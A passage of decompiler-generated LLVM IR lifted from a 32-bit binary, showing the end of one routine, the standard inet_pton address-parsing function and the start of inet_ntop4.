  %v4_8053d09 = call i32 @memcpy(i16* %v3_8053d09, i32 4, i32 %v0_8053d00)
  %v0_8053d13 = load i32, i32* @esp, align 4
  %v6_8053d13 = icmp eq i32 %v0_8053d13, -16
  store i1 %v6_8053d13, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8053d1a

dec_label_pc_8053d18:                             ; preds = %dec_label_pc_8053ce8, %dec_label_pc_8053ce4, %dec_label_pc_8053cdf, %dec_label_pc_8053cd5, %dec_label_pc_8053cbe, %dec_label_pc_8053cfb
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8053d1a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053d1a

dec_label_pc_8053d1a:                             ; preds = %dec_label_pc_8053d00, %dec_label_pc_8053d18
  %v0_8053d1a = phi i32 [ %v15_8053ca8, %dec_label_pc_8053d00 ], [ %v0_8053d1a.pre, %dec_label_pc_8053d18 ]
  %v0_8053d21 = phi i32 [ 1, %dec_label_pc_8053d00 ], [ 0, %dec_label_pc_8053d18 ]
  %v9_8053d1a = icmp eq i32 %v0_8053d1a, -28
  store i1 %v9_8053d1a, i1* %zf.global-to-local, align 1
  %v2_8053d1d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053d1d, i32* @ebx, align 4
  store i32 %v0_8053ca2, i32* @esi, align 4
  ret i32 %v0_8053d21

; uselistorder directives
  uselistorder i32 %v0_8053cfb, { 1, 0 }
  uselistorder i32 %v3_8053cf3, { 1, 0 }
  uselistorder i8 %v2_8053cf3, { 1, 2, 0 }
  uselistorder i1 %v9_8053ce8, { 1, 0 }
  uselistorder i32 %v1_8053cd6, { 1, 0 }
  uselistorder i32 %v3_8053cc4, { 1, 2, 0, 3 }
  uselistorder i8 %v2_8053cf322, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8053d1a, { 1, 0 }
  uselistorder label %dec_label_pc_8053d18, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8053cb6, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053d22 = load i32, i32* @ebp, align 4
  %v0_8053d23 = load i32, i32* @edi, align 4
  %v0_8053d24 = load i32, i32* @esi, align 4
  %v0_8053d25 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8053d2d = ptrtoint i8* %arg2 to i32
  store i32 %v4_8053d2d, i32* @edi, align 4
  %v9_8053d31 = icmp eq i32 %arg1, 2
  br i1 %v9_8053d31, label %dec_label_pc_8053d41, label %dec_label_pc_8053d36

dec_label_pc_8053d36:                             ; preds = %entry
  %v9_8053d36 = icmp eq i32 %arg1, 10
  %v1_8053d39 = icmp eq i1 %v9_8053d36, false
  br i1 %v1_8053d39, label %dec_label_pc_8053ed2, label %dec_label_pc_8053d51

dec_label_pc_8053d41:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8053d2d, i32* @eax, align 4
  %v3_8053d47 = call i32 @inet_pton4(i32 %v0_8053d25, i32 %v0_8053d24, i32 %v0_8053d23)
  store i32 %v3_8053d47, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ee4

dec_label_pc_8053d51:                             ; preds = %dec_label_pc_8053d36
  %v2_8053d56 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053d56, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8053d5b = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8053d5b, i32* @ebx, align 4
  %v2_8053d62 = add i32 %v5_8053d5b, 16
  store i32 %v2_8053d62, i32* %eax.global-to-local, align 4
  %v0_8053d6c = load i32, i32* @edi, align 4
  %v1_8053d6c = inttoptr i32 %v0_8053d6c to i8*
  %v2_8053d6c = load i8, i8* %v1_8053d6c, align 1
  %v11_8053d6c = icmp eq i8 %v2_8053d6c, 58
  %v1_8053d6f = icmp eq i1 %v11_8053d6c, false
  br i1 %v1_8053d6f, label %dec_label_pc_8053e02, label %dec_label_pc_8053d71

dec_label_pc_8053d71:                             ; preds = %dec_label_pc_8053d51
  %v1_8053d71 = add i32 %v0_8053d6c, 1
  store i32 %v1_8053d71, i32* @edi, align 4
  %v1_8053d72 = inttoptr i32 %v1_8053d71 to i8*
  %v2_8053d72 = load i8, i8* %v1_8053d72, align 1
  %v11_8053d72 = icmp eq i8 %v2_8053d72, 58
  %v1_8053d75 = icmp eq i1 %v11_8053d72, false
  br i1 %v1_8053d75, label %dec_label_pc_8053ee2, label %dec_label_pc_8053e02

dec_label_pc_8053d89:                             ; preds = %dec_label_pc_8053e42
  %v0_8053d8a = load i32, i32* @edi, align 4
  %v1_8053d8a = add i32 %v0_8053d8a, 1
  store i32 %v1_8053d8a, i32* @edi, align 4
  %v4_8053d92 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8058674.255, i32 0, i32 0), i32 %v2_8053e49)
  store i32 %v4_8053d92, i32* %eax.global-to-local, align 4
  %v1_8053d9a = icmp eq i32 %v4_8053d92, 0
  br i1 %v1_8053d9a, label %dec_label_pc_8053db9, label %dec_label_pc_8053d9e

dec_label_pc_8053d9e:                             ; preds = %dec_label_pc_8053d89
  %v0_8053d9e = load i32, i32* @ebp, align 4
  %v2_8053d9e = mul i32 %v0_8053d9e, 16
  %v1_8053da1 = add i32 %v4_8053d92, -134579828
  store i32 %v1_8053da1, i32* %eax.global-to-local, align 4
  %v2_8053da6 = or i32 %v2_8053d9e, %v1_8053da1
  store i32 %v2_8053da6, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8053da6, 65536
  br i1 %tmp, label %dec_label_pc_8053d9e.dec_label_pc_8053e42.outer_crit_edge, label %dec_label_pc_8053ee2

dec_label_pc_8053d9e.dec_label_pc_8053e42.outer_crit_edge: ; preds = %dec_label_pc_8053d9e
  %v0_8053e42.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053e42.outer

dec_label_pc_8053e42.outer:                       ; preds = %dec_label_pc_8053d9e.dec_label_pc_8053e42.outer_crit_edge, %dec_label_pc_8053e02
  %v0_8053e42.pre = phi i32 [ %v0_8053e42.pre.pre, %dec_label_pc_8053d9e.dec_label_pc_8053e42.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8053e02 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053d9e.dec_label_pc_8053e42.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_8053e02 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8053d9e.dec_label_pc_8053e42.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_8053e02 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8053d9e.dec_label_pc_8053e42.outer_crit_edge ], [ 0, %dec_label_pc_8053e02 ]
  %v4_8053dbe = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8053dc3 = icmp eq i1 %v4_8053dbe, false
  br label %dec_label_pc_8053e42

dec_label_pc_8053db9:                             ; preds = %dec_label_pc_8053d89
  %v0_8053db9 = load i32, i32* @esi, align 4
  %v9_8053db9 = icmp eq i32 %v0_8053db9, 58
  %v1_8053dbc = icmp eq i1 %v9_8053db9, false
  br i1 %v1_8053dbc, label %dec_label_pc_8053e0e, label %dec_label_pc_8053dbe

dec_label_pc_8053dbe:                             ; preds = %dec_label_pc_8053db9
  br i1 %v1_8053dc3, label %dec_label_pc_8053dda, label %dec_label_pc_8053dc5

dec_label_pc_8053dc5:                             ; preds = %dec_label_pc_8053dbe
  %v5_8053dc5 = icmp eq i8* %stack_var_-44.1, null
  %v1_8053dca = icmp eq i1 %v5_8053dc5, false
  br i1 %v1_8053dca, label %dec_label_pc_8053ee2, label %dec_label_pc_8053dd0

dec_label_pc_8053dd0:                             ; preds = %dec_label_pc_8053dc5
  %v0_8053dd0 = load i32, i32* @ebx, align 4
  %v5_8053dd0 = inttoptr i32 %v0_8053dd0 to i8*
  %v0_8053dd4 = load i32, i32* @edi, align 4
  %v5_8053dd4 = inttoptr i32 %v0_8053dd4 to i8*
  br label %dec_label_pc_8053e42

dec_label_pc_8053dda:                             ; preds = %dec_label_pc_8053dbe
  %v0_8053dda = load i32, i32* @edi, align 4
  %v1_8053dda = inttoptr i32 %v0_8053dda to i8*
  %v2_8053dda = load i8, i8* %v1_8053dda, align 1
  %v3_8053dda = icmp eq i8 %v2_8053dda, 0
  br i1 %v3_8053dda, label %dec_label_pc_8053ee2, label %dec_label_pc_8053de3

dec_label_pc_8053de3:                             ; preds = %dec_label_pc_8053dda
  %v0_8053de3 = load i32, i32* @ebx, align 4
  %v1_8053de3 = add i32 %v0_8053de3, 2
  store i32 %v1_8053de3, i32* @edx, align 4
  %v6_8053dea = icmp ugt i32 %v1_8053de3, %v2_8053d62
  br i1 %v6_8053dea, label %dec_label_pc_8053ee2, label %dec_label_pc_8053df0

dec_label_pc_8053df0:                             ; preds = %dec_label_pc_8053de3
  %v0_8053df0 = load i32, i32* @ebp, align 4
  %v2_8053df2 = udiv i32 %v0_8053df0, 256
  %v4_8053df2 = trunc i32 %v2_8053df2 to i8
  %v3_8053df5 = inttoptr i32 %v0_8053de3 to i8*
  store i8 %v4_8053df2, i8* %v3_8053df5, align 1
  %v0_8053df7 = load i32, i32* @ebp, align 4
  store i32 %v0_8053df7, i32* %eax.global-to-local, align 4
  %v1_8053df9 = trunc i32 %v0_8053df7 to i8
  %v2_8053df9 = load i32, i32* @ebx, align 4
  %v3_8053df9 = add i32 %v2_8053df9, 1
  %v4_8053df9 = inttoptr i32 %v3_8053df9 to i8*
  store i8 %v1_8053df9, i8* %v4_8053df9, align 1
  %v0_8053dfc = load i32, i32* @edx, align 4
  store i32 %v0_8053dfc, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053e02

dec_label_pc_8053e02:                             ; preds = %dec_label_pc_8053d51, %dec_label_pc_8053d71, %dec_label_pc_8053df0
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8053df0 ], [ %v1_8053d71, %dec_label_pc_8053d71 ], [ %v0_8053d6c, %dec_label_pc_8053d51 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053df0 ], [ null, %dec_label_pc_8053d71 ], [ null, %dec_label_pc_8053d51 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8053e42.outer

dec_label_pc_8053e0e:                             ; preds = %dec_label_pc_8053db9
  %v9_8053e0e = icmp eq i32 %v0_8053db9, 46
  %v1_8053e11 = icmp eq i1 %v9_8053e0e, false
  br i1 %v1_8053e11, label %dec_label_pc_8053ee2, label %dec_label_pc_8053e17

dec_label_pc_8053e17:                             ; preds = %dec_label_pc_8053e0e
  %v0_8053e17 = load i32, i32* @ebx, align 4
  %v1_8053e17 = add i32 %v0_8053e17, 4
  store i32 %v1_8053e17, i32* @esi, align 4
  %v6_8053e1e = icmp ugt i32 %v1_8053e17, %v2_8053d62
  br i1 %v6_8053e1e, label %dec_label_pc_8053ee2, label %dec_label_pc_8053e24

dec_label_pc_8053e24:                             ; preds = %dec_label_pc_8053e17
  %v4_8053e24 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8053e24, i32* @eax, align 4
  store i32 %v0_8053e17, i32* @edx, align 4
  store i32 %v1_8053e17, i32* @ebx, align 4
  %v2_8053e2c = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053e2c = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8053e2c, i32 %v2_8053d62)
  store i32 %v5_8053e2c, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_8053e2c, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8053e79, label %dec_label_pc_8053ee2

dec_label_pc_8053e42:                             ; preds = %dec_label_pc_8053e42.outer, %dec_label_pc_8053dd0
  %v0_8053e42 = phi i32 [ %v0_8053dd4, %dec_label_pc_8053dd0 ], [ %v0_8053e42.pre, %dec_label_pc_8053e42.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8053dd0, %dec_label_pc_8053dd0 ], [ %stack_var_-44.1.ph, %dec_label_pc_8053e42.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8053dd4, %dec_label_pc_8053dd0 ], [ %stack_var_-36.1.ph, %dec_label_pc_8053e42.outer ]
  %v1_8053e42 = inttoptr i32 %v0_8053e42 to i8*
  %v2_8053e42 = load i8, i8* %v1_8053e42, align 1
  %v3_8053e42 = sext i8 %v2_8053e42 to i32
  store i32 %v3_8053e42, i32* %eax.global-to-local, align 4
  %v2_8053e49 = call i32 @__GI_tolower(i32 %v3_8053e42)
  store i32 %v2_8053e49, i32* %eax.global-to-local, align 4
  %v1_8053e51 = icmp eq i32 %v2_8053e49, 0
  store i32 %v2_8053e49, i32* @esi, align 4
  %v1_8053e55 = icmp eq i1 %v1_8053e51, false
  br i1 %v1_8053e55, label %dec_label_pc_8053d89, label %dec_label_pc_8053e5b

dec_label_pc_8053e5b:                             ; preds = %dec_label_pc_8053e42
  br i1 %v4_8053dbe, label %dec_label_pc_8053e79, label %dec_label_pc_8053e62

dec_label_pc_8053e62:                             ; preds = %dec_label_pc_8053e5b
  %v0_8053e62 = load i32, i32* @ebx, align 4
  %v1_8053e62 = add i32 %v0_8053e62, 2
  store i32 %v1_8053e62, i32* @edx, align 4
  %v6_8053e69 = icmp ugt i32 %v1_8053e62, %v2_8053d62
  br i1 %v6_8053e69, label %dec_label_pc_8053ee2, label %dec_label_pc_8053e6b

dec_label_pc_8053e6b:                             ; preds = %dec_label_pc_8053e62
  %v0_8053e6b = load i32, i32* @ebp, align 4
  %v2_8053e6d = udiv i32 %v0_8053e6b, 256
  %v4_8053e6d = trunc i32 %v2_8053e6d to i8
  %v3_8053e70 = inttoptr i32 %v0_8053e62 to i8*
  store i8 %v4_8053e6d, i8* %v3_8053e70, align 1
  %v0_8053e72 = load i32, i32* @ebp, align 4
  store i32 %v0_8053e72, i32* %eax.global-to-local, align 4
  %v1_8053e74 = trunc i32 %v0_8053e72 to i8
  %v2_8053e74 = load i32, i32* @ebx, align 4
  %v3_8053e74 = add i32 %v2_8053e74, 1
  %v4_8053e74 = inttoptr i32 %v3_8053e74 to i8*
  store i8 %v1_8053e74, i8* %v4_8053e74, align 1
  %v0_8053e77 = load i32, i32* @edx, align 4
  store i32 %v0_8053e77, i32* @ebx, align 4
  br label %dec_label_pc_8053e79

dec_label_pc_8053e79:                             ; preds = %dec_label_pc_8053e5b, %dec_label_pc_8053e24, %dec_label_pc_8053e6b
  %v4_8053e79 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053e79 = icmp eq i8* %stack_var_-44.1, null
  %v0_8053eb1.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8053e79, label %dec_label_pc_8053eb1, label %dec_label_pc_8053e80

dec_label_pc_8053e80:                             ; preds = %dec_label_pc_8053e79
  store i32 1, i32* @esi, align 4
  %v6_8053e87 = sub i32 %v0_8053eb1.pre, %v4_8053e79
  store i32 %v6_8053e87, i32* @edi, align 4
  %v16_8053e8b = icmp eq i32 %v0_8053eb1.pre, %v2_8053d62
  %v1_8053e8f = icmp eq i1 %v16_8053e8b, false
  br i1 %v1_8053e8f, label %dec_label_pc_8053ea9.preheader, label %dec_label_pc_8053ee2

dec_label_pc_8053ea9.preheader:                   ; preds = %dec_label_pc_8053e80
  %v3_8053ea988 = inttoptr i32 %v6_8053e87 to i8*
  %v9_8053eab97 = icmp slt i8* %v3_8053ea988, inttoptr (i32 1 to i8*)
  br i1 %v9_8053eab97, label %dec_label_pc_8053ead, label %dec_label_pc_8053e93

dec_label_pc_8053e93:                             ; preds = %dec_label_pc_8053ea9.preheader, %dec_label_pc_8053e93
  %v0_8053ea199 = phi i32 [ %v0_8053ea9.pre, %dec_label_pc_8053e93 ], [ 1, %dec_label_pc_8053ea9.preheader ]
  %v0_8053e9398 = phi i32 [ %v1_8053ea9.pre, %dec_label_pc_8053e93 ], [ %v6_8053e87, %dec_label_pc_8053ea9.preheader ]
  %v2_8053e99 = sub i32 %v0_8053e9398, %v0_8053ea199
  %v6_8053e9b = add i32 %v2_8053e99, %v4_8053e79
  store i32 %v6_8053e9b, i32* %eax.global-to-local, align 4
  %v2_8053e9f = sub i32 %v2_8053d62, %v0_8053ea199
  store i32 %v2_8053e9f, i32* @ecx, align 4
  %v1_8053ea1 = add i32 %v0_8053ea199, 1
  store i32 %v1_8053ea1, i32* @esi, align 4
  %v1_8053ea2 = inttoptr i32 %v6_8053e9b to i8*
  %v2_8053ea2 = load i8, i8* %v1_8053ea2, align 1
  %v3_8053ea2 = zext i8 %v2_8053ea2 to i32
  %v4_8053ea2 = load i32, i32* @edx, align 4
  %v5_8053ea2 = and i32 %v4_8053ea2, -256
  %v6_8053ea2 = or i32 %v5_8053ea2, %v3_8053ea2
  store i32 %v6_8053ea2, i32* @edx, align 4
  %v3_8053ea4 = inttoptr i32 %v2_8053e9f to i8*
  store i8 %v2_8053ea2, i8* %v3_8053ea4, align 1
  %v0_8053ea6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ea6 = inttoptr i32 %v0_8053ea6 to i8*
  store i8 0, i8* %v1_8053ea6, align 1
  %v0_8053ea9.pre = load i32, i32* @esi, align 4
  %v1_8053ea9.pre = load i32, i32* @edi, align 4
  %v2_8053ea9 = inttoptr i32 %v0_8053ea9.pre to i8*
  %v3_8053ea9 = inttoptr i32 %v1_8053ea9.pre to i8*
  %v9_8053eab = icmp sgt i8* %v2_8053ea9, %v3_8053ea9
  br i1 %v9_8053eab, label %dec_label_pc_8053ead, label %dec_label_pc_8053e93

dec_label_pc_8053ead:                             ; preds = %dec_label_pc_8053e93, %dec_label_pc_8053ea9.preheader
  br label %dec_label_pc_8053eb1

dec_label_pc_8053eb1:                             ; preds = %dec_label_pc_8053e79, %dec_label_pc_8053ead
  %v0_8053eb1 = phi i32 [ %v2_8053d62, %dec_label_pc_8053ead ], [ %v0_8053eb1.pre, %dec_label_pc_8053e79 ]
  %v16_8053eb1 = icmp eq i32 %v0_8053eb1, %v2_8053d62
  %v1_8053eb5 = icmp eq i1 %v16_8053eb1, false
  br i1 %v1_8053eb5, label %dec_label_pc_8053ee2, label %dec_label_pc_8053eb7

dec_label_pc_8053eb7:                             ; preds = %dec_label_pc_8053eb1
  store i32 %v2_8053d56, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8053ec3 = call i32 @memcpy(i16* %tmp63, i32 %v2_8053d56, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ee4

dec_label_pc_8053ed2:                             ; preds = %dec_label_pc_8053d36
  %v1_8053ed2 = call i32 @__errno_location(i32 %v0_8053d25)
  %v1_8053ed7 = inttoptr i32 %v1_8053ed2 to i32*
  store i32 97, i32* %v1_8053ed7, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ee4

dec_label_pc_8053ee2:                             ; preds = %dec_label_pc_8053de3, %dec_label_pc_8053dda, %dec_label_pc_8053d9e, %dec_label_pc_8053dc5, %dec_label_pc_8053e80, %dec_label_pc_8053e24, %dec_label_pc_8053eb1, %dec_label_pc_8053e62, %dec_label_pc_8053e17, %dec_label_pc_8053e0e, %dec_label_pc_8053d71
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ee4

dec_label_pc_8053ee4:                             ; preds = %dec_label_pc_8053ed2, %dec_label_pc_8053eb7, %dec_label_pc_8053d41, %dec_label_pc_8053ee2
  %v0_8053eeb = phi i32 [ -1, %dec_label_pc_8053ed2 ], [ 1, %dec_label_pc_8053eb7 ], [ %v3_8053d47, %dec_label_pc_8053d41 ], [ 0, %dec_label_pc_8053ee2 ]
  store i32 %v0_8053d25, i32* @ebx, align 4
  store i32 %v0_8053d24, i32* @esi, align 4
  store i32 %v0_8053d23, i32* @edi, align 4
  store i32 %v0_8053d22, i32* @ebp, align 4
  ret i32 %v0_8053eeb

; uselistorder directives
  uselistorder i32 %v1_8053ea9.pre, { 1, 0 }
  uselistorder i32 %v0_8053ea9.pre, { 1, 0 }
  uselistorder i32 %v0_8053ea199, { 2, 1, 0 }
  uselistorder i32 %v0_8053eb1.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8053e49, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8053d62, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8053d25, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8053ee4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053ee2, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8053eb1, { 1, 0 }
  uselistorder label %dec_label_pc_8053e93, { 1, 0 }
  uselistorder label %dec_label_pc_8053e79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053e42, { 1, 0 }
  uselistorder label %dec_label_pc_8053e02, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053e42.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_8053eed = load i32, i32* @edi, align 4
  %v0_8053eee = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_8053ef2 = ptrtoint i32* %stack_var_-76 to i32
  %v0_8053ef5 = load i32, i32* @eax, align 4
  %v3_8053ef9 = and i32 %v0_8053ef5, -65536
  %v2_8053eff = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_8053f04 = load i32, i32* @edx, align 4
  %v5_8053f04 = inttoptr i32 %v0_8053f04 to i8*
  store i8* %v5_8053f04, i8** %stack_var_-56, align 4
  %v0_8053f08 = load i32, i32* @ecx, align 4
  store i32 %v3_8053ef9, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8053f13 = add i32 %v2_8053eff, 4
  store i32 %v6_8053f13, i32* %edi.global-to-local, align 4
  %v2_8053f14 = inttoptr i32 %v6_8053f13 to i32*
  store i32 0, i32* %v2_8053f14, align 4
  %v3_8053f14 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053f14 = add i32 %v3_8053f14, 4
  store i32 %v6_8053f14, i32* %edi.global-to-local, align 4
  %v0_8053f15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053f15 = inttoptr i32 %v6_8053f14 to i32*
  store i32 %v0_8053f15, i32* %v2_8053f15, align 4
  %v3_8053f15 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053f15 = add i32 %v3_8053f15, 4
  store i32 %v6_8053f15, i32* %edi.global-to-local, align 4
  %v0_8053f16 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f16 = trunc i32 %v0_8053f16 to i16
  %v3_8053f16 = inttoptr i32 %v6_8053f15 to i16*
  store i16 %v1_8053f16, i16* %v3_8053f16, align 2
  %v4_8053f16 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053f16 = add i32 %v4_8053f16, 2
  %v0_8053f18 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f18 = trunc i32 %v0_8053f18 to i8
  %v3_8053f18 = inttoptr i32 %v7_8053f16 to i8*
  store i8 %v1_8053f18, i8* %v3_8053f18, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_8053fb330 = load i32, i32* @esi, align 4
  %v10_8053fb336 = icmp eq i32 %v0_8053fb330, 3
  store i1 %v10_8053fb336, i1* %zf.global-to-local, align 1
  %v7_8053fb638 = icmp sgt i32 %v0_8053fb330, 3
  br i1 %v7_8053fb638, label %dec_label_pc_8053fbc, label %dec_label_pc_8053f20

dec_label_pc_8053f20:                             ; preds = %dec_label_pc_8053f93, %entry
  %v3_8053f36 = phi i32 [ 0, %entry ], [ %v1_8053fbc.pre, %dec_label_pc_8053f93 ]
  %v0_8053fb339 = phi i32 [ %v0_8053fb330, %entry ], [ %v0_8053fb3, %dec_label_pc_8053f93 ]
  %v2_8053f26 = add i32 %v0_8053fb339, %v0_8053ef5
  %v12_8053f26 = icmp eq i32 %v2_8053f26, 0
  store i1 %v12_8053f26, i1* %zf.global-to-local, align 1
  store i32 %v2_8053f26, i32* %ebp.global-to-local, align 4
  %v1_8053f28 = inttoptr i32 %v2_8053f26 to i8*
  %v2_8053f28 = load i8, i8* %v1_8053f28, align 1
  %v3_8053f28 = zext i8 %v2_8053f28 to i32
  %v4_8053f28 = load i32, i32* @edx, align 4
  %v5_8053f28 = and i32 %v4_8053f28, -65536
  %v6_8053f28 = or i32 %v5_8053f28, %v3_8053f28
  store i32 %v6_8053f28, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_8053f28, 100
  %v6_8053f2f = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_8053f28, 100
  %v12_8053f2f = zext i8 %tmp24 to i32
  %v14_8053f2f = mul nuw nsw i32 %v12_8053f2f, 256
  %v15_8053f2f = or i32 %v6_8053f2f, %v5_8053f28
  %v16_8053f2f = or i32 %v15_8053f2f, %v14_8053f2f
  store i32 %v16_8053f2f, i32* %eax.global-to-local, align 4
  %v2_8053f33 = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8053f36 = load i32, i32* @esp, align 4
  %v4_8053f36 = add i32 %v2_8053f36, 43
  %v5_8053f36 = add i32 %v4_8053f36, %v3_8053f36
  %v6_8053f36 = inttoptr i32 %v5_8053f36 to i8*
  store i8 %v2_8053f33, i8* %v6_8053f36, align 1
  %v0_8053f3a = load i32, i32* %edi.global-to-local, align 4
  %v1_8053f3a = add i32 %v0_8053f3a, 1
  store i32 %v0_8053f3a, i32* @ecx, align 4
  %v0_8053f43 = load i32, i32* @esp, align 4
  %v2_8053f43 = add i32 %v0_8053f3a, 43
  %v3_8053f43 = add i32 %v2_8053f43, %v0_8053f43
  %v4_8053f43 = inttoptr i32 %v3_8053f43 to i8*
  %v5_8053f43 = load i8, i8* %v4_8053f43, align 1
  %v11_8053f43 = icmp eq i8 %v5_8053f43, 48
  store i1 %v11_8053f43, i1* %zf.global-to-local, align 1
  %v1_8053f48 = icmp eq i1 %v11_8053f43, false
  %v0_8053f72 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8053f48, label %dec_label_pc_8053f70, label %dec_label_pc_8053f4a

dec_label_pc_8053f4a:                             ; preds = %dec_label_pc_8053f20
  %v3_8053f4e = trunc i32 %v0_8053f72 to i16
  %v5_8053f4e = udiv i16 %v3_8053f4e, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8053f4e, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8053f60 = trunc i16 %tmp42 to i8
  %v2_8053f60 = or i8 %v1_8053f60, 48
  %v12_8053f60 = zext i8 %v2_8053f60 to i32
  store i32 %v12_8053f60, i32* %eax.global-to-local, align 4
  %v7_8053f62 = icmp eq i8 %v1_8053f60, 0
  store i1 %v7_8053f62, i1* %zf.global-to-local, align 1
  store i8 %v2_8053f60, i8* %v4_8053f43, align 1
  %v0_8053f68 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8053f68, label %dec_label_pc_8053f93, label %dec_label_pc_8053f6a

dec_label_pc_8053f6a:                             ; preds = %dec_label_pc_8053f4a
  store i32 %v1_8053f3a, i32* @ecx, align 4
  br label %dec_label_pc_8053f93

dec_label_pc_8053f70:                             ; preds = %dec_label_pc_8053f20
  store i32 %v1_8053f3a, i32* %ebx.global-to-local, align 4
  %v3_8053f78 = trunc i32 %v0_8053f72 to i16
  %v5_8053f78 = udiv i16 %v3_8053f78, 10
  %tmp43 = urem i16 %v5_8053f78, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
